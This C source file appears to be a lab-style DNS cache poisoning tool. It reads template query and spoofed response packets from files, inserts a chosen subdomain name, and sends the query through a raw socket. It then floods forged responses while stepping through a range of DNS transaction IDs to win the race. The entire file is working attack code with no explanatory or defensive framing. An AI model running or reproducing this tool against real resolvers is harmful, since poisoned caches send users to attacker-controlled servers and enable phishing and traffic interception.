#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define sz 			1000
#define name_sz 	5

struct ipheader {
	unsigned char 		iph_ihl:4, iph_ver:4; 
	unsigned char 		iph_tos; 
	unsigned short int 	iph_len; 
	unsigned short int 	iph_ident; 
	unsigned short int 	iph_flag:3, iph_offset:13; 
	unsigned char 	  	iph_ttl; 
	unsigned char 		iph_protocol; 
	unsigned short int  iph_chksum; 
	struct in_addr		iph_sourceip; 
	struct in_addr 		iph_destip; 
};

void send_pkt(char *buf, int buf_sz)
{
	struct sockaddr_in addr; 
	int enable = 1; 

	// construct a raw socket, domain: IPv4, socket type: raw: protocol: raw  
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sock < 0) {
		perror("[-] Error when creating the socket");
		exit(1); 
	}

	// set socket option
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

	// set info 
	struct ipheader *iph = (struct ipheader *) buf;       
	addr.sin_family = AF_INET; 
	addr.sin_addr = iph->iph_destip; 

	// send the message   
	if (sendto(sock, buf, buf_sz, 0, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("[-] Error when sending the message");
		close(sock); 
		exit(1);  
	}

	close(sock); 
}

int main(int argc, char **argv)
{
	srand(time(NULL));

	unsigned char ipq[sz], ipr[sz], ipm[sz];   
	int nq, nr, nm; 
	char *name = argv[1]; 
	int domain_sz = atoi(argv[2]); 
	unsigned short start = (unsigned short) atoi(argv[3]); 
	unsigned short end = (unsigned short) atoi(argv[4]); 
	unsigned short qid = 0;  
	
	FILE *fq = fopen("query.bin", "rb");         // query packet
	if (!fq) {
		perror("[-] Error when opening query packet");
		exit(1);
	}
	nq = fread(ipq, 1, sz, fq);    

	FILE *fr = fopen("response.bin", "rb");         // response packet 
	if (!fr) {
		perror("[-] Error when opening response packet");
		exit(1);
	}
	nr = fread(ipr, 1, sz, fr);

	// copy random qname into the query packet, qname offset = 0x29 
	memcpy(ipq + 0x29, name, 5);
	send_pkt(ipq, nq);

	// construct the forged response, qname offsets = 0x29 and (0x29 + 12 + x)
	memcpy(ipr + 0x29, name, 5);
	memcpy(ipr + 0x29 + 12 + domain_sz, name, 5);

	// construct the forged response, qid offset = 0x1C 
	for (unsigned short i = start; i < end; i++) {
		qid = i; 
		qid = i << 8 | i >> 8; 
		memcpy(ipr + 0x1c, &qid, 2);
		send_pkt(ipr, nr); 
	}

	qid = end << 8 | end >> 8; 
	memcpy(ipr + 0x1c, &qid, 2);
	send_pkt(ipr, nr); 

	fclose(fq);
	fclose(fr);

	return 0; 
}